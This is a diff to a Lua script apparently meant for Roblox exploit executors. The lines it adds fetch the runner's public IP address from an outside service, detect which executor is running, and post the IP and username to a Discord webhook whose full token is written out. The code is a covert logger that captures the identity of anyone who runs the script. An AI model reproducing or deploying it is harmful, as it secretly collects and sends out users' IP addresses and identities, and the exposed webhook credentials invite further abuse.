@@ -1,5 +1,34 @@
- local msg = "  " .. game.Players.LocalPlayer.Name .. " trieasdasdds to execute your script."
-local url = "https://discord.com/api/webhooks/1041254667851681802/LYCar5cDa9_J_0Zz-Y1DvJpvD5Uh2z8jhmebfG3CcIFFUzUrau1e1oDQkOT1HrBtnabi"
+local ip = tostring(game:HttpGet("https://ip.seeip.org/", true))
 
-syn.request({Url = url, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = game:GetService("HttpService"):JSONEncode({["content"]=msg})})
-      setclipboard(grouplink)
+local webhookcheck =
+   is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
+   secure_load and "Sentinel" or
+   KRNL_LOADED and "Krnl" or
+   SONA_LOADED and "Sona" or
+   "Kid with shit exploit"
+
+local url =
+   "https://discord.com/api/webhooks/1041253696023052299/zo1t-KCWwxSzayYX6vk7ogv_3ayw8w75Xom-t0FUJRzmx3ESbvKczbH4Iv8uNZAxQ8_B"
+local data = { 
+   ["content"] = "  Userip : **"..ip.."**",
+   ["embeds"] = {
+       {
+           ["title"] = "**Someone Tried to Executed Your Script!**",
+           ["description"] =   "Username: " .. game.Players.LocalPlayer.Name.." with **"..webhookcheck.."**"  ,
+           ["type"] = "rich",
+           ["color"] = tonumber(0x7269da),
+           ["image"] = {
+               ["url"] = "https://www.google.com/url?sa=i&url=https%3A%2F%2Fwww.houseandgarden.co.uk%2Fgallery%2Flesser-known-autumn-flowers-to-grow&psig=AOvVaw2Uu78GJoc8esYGSzUcaY5c&ust=1668409972968000&source=images&cd=vfe&ved=0CA8QjRxqFwoTCOj6ndDNqvsCFQAAAAAdAAAAABAE" ..
+                   tostring(game:GetService("Players").LocalPlayer.Name)
+           }
+       }
+   }
+}
+local newdata = game:GetService("HttpService"):JSONEncode(data)
+
+local headers = {
+   ["content-type"] = "application/json"
+}
+request = http_request or request or HttpPost or syn.request
+local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+request(abcdef)
